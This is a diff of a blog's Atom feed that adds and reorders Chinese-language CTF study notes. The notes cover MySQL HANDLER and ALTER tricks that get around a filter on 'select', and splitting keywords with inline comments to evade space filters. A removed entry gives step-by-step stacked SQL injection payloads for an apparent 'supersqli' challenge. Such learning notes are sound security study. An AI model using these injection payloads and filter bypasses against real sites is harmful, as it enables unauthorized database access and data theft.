@@ -380,6 +380,32 @@ MathJax = {
   </entry>
   
   <entry>
+    <title>SQL&#39;select&#39;绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:05:20.554Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+&lt;hr&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
     <title>SQL union联合注入</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
@@ -405,20 +431,20 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL&#39;select&#39;绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
+    <title>SQL空格绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:20.554Z</updated>
+    <updated>2026-02-06T17:05:40.978Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;</summary>
+&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
       
     
     
@@ -457,6 +483,30 @@ MathJax = {
   </entry>
   
   <entry>
+    <title>Crypto实用函数类</title>
+    <link href="https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
+    <id>https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:47:27.964Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;crypto-python函数类&quot;&gt;&lt;a href=&quot;#crypto-python函数类&quot; class=&quot;headerlink&quot; title=&quot;crypto python函数类&quot;&gt;&lt;/a&gt;crypto python函数类&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： cryp</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
+    
+    
+    <category term="python" scheme="https://smileless-l.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
     <title>SQLite</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQLite/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQLite/</id>
@@ -479,58 +529,6 @@ MathJax = {
     
     
     <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL堆叠注入</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:00:57.003Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL空格绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:40.978Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
